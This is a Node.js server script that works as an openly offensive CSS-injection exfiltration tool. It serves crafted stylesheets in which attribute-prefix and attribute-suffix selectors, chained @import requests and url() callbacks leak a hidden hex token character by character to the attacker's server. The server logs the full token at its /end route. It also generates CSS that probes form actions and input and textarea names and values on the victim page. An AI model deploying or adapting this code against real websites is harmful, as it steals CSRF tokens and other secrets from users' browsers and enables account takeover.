const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const DEBUG = false;

const MAX_ELEMENTS = 20;
const MAX_VALUE_LEN = 32;
const MAX_FORMS = 4;
const MAX_FORM_ACTION_LEN = 50;

const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126);

var selector = "", attribute = "", prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0, variables = [];

var discoverCSS = generateDiscoverCSS();

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/log":
            response.end();
        break
        case "/discover":
            discoverResponse(response)
            break;
        case "/start":
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && prefix !== req.query.pre) {
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            console.log('[+] END: %s', req.query.token);
        default:
            response.end();
    }
}

const discoverResponse = (response) => {
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(discoverCSS);
    response.end();
};

const genResponse = (response) => {
    const hex = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'];
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
        hex.map(e => (selector + '['+attribute+'$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + encodeURIComponent(postfix) + ');}')).join('') +
        hex.map(e => (selector + '['+attribute+'^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + encodeURIComponent(prefix) + e +');}')).join('');
        if(n === 0) {
            let properties = [];
            for(let i=0;i<32;i++) {      
                  properties.push('var(--e'+i+',none),var(--s'+i+',none),var(--full-token,none)');
            }
            css += `${selector}{background:${properties.join(',')};}`;
         }
    css += selector + '['+attribute+'="'+ prefix + postfix + '"]{--full-token:url(' + HOSTNAME + '/end?token=' + encodeURIComponent(prefix) + encodeURIComponent(postfix) + ');}';
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}

function escapeCSS(str) {
    return str.replace(/(["\\])/,'\\$1');
}

function discoverElements(elementName, checkName, checkValue, checkAction, elementAmount) {
    let css = '';
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=elementAmount;j++) {
            if(checkName) {
                css += generateRule(elementName, CHARS[i], j, "NameBegins", "name^=");
                css += generateRule(elementName, CHARS[i], j, "NameEnds", "name$=");
            }
            if(checkValue) {
                css += generateRule(elementName, CHARS[i], j, "ValueBegins", "value^=");
                css += generateRule(elementName, CHARS[i], j, "ValueEnds", "value$=");
            }
            if(checkAction) {
                css += generateRule(elementName, CHARS[i], j, "ActionBegins", "action^=");
                css += generateRule(elementName, CHARS[i], j, "ActionEnds", "action$=");
            }
        }
    }
    if(checkName) {
        generateTokenVariables(elementName, elementAmount, "NameToken");
    }
    if(checkValue) {
        generateTokenVariables(elementName, elementAmount, "ValueToken");
    }
    if(checkAction) {
        generateTokenVariables(elementName, elementAmount, "ActionToken");
    }
    return css;
}

function generateRule(elementName, character, nth, variableSuffix, attributeSelector) {
    let variable = '--'+elementName+nth+variableSuffix;
    let rule = 'html:has('+elementName+'['+attributeSelector+'"'+escapeCSS(character)+'"]:nth-of-type('+nth+')){--'+elementName+nth+variableSuffix+': url(/log?'+elementName+nth+variableSuffix+'='+encodeURIComponent(character)+');}';
    variables.push(variable);
    return rule;
}

function generateTokenVariables(elementName, elementAmount, variableSuffix) {
    for(let j=1;j<=elementAmount;j++) {
        variables.push('--'+elementName+j+variableSuffix);
    }
}

function generateVariables() {
    return variables.map(e=>'var('+e+',none)').join(',');
}

function generateDiscoverCSS() {
    let css = '';
    css += discoverElements('form', false, false, true, MAX_FORMS);
    css += discoverElements('input', true, true, false, MAX_ELEMENTS);
    css += discoverElements('textarea', true, true, false, MAX_ELEMENTS);
    css += `
            html {
                background:${generateVariables()};
            }
    `;
    return css;
}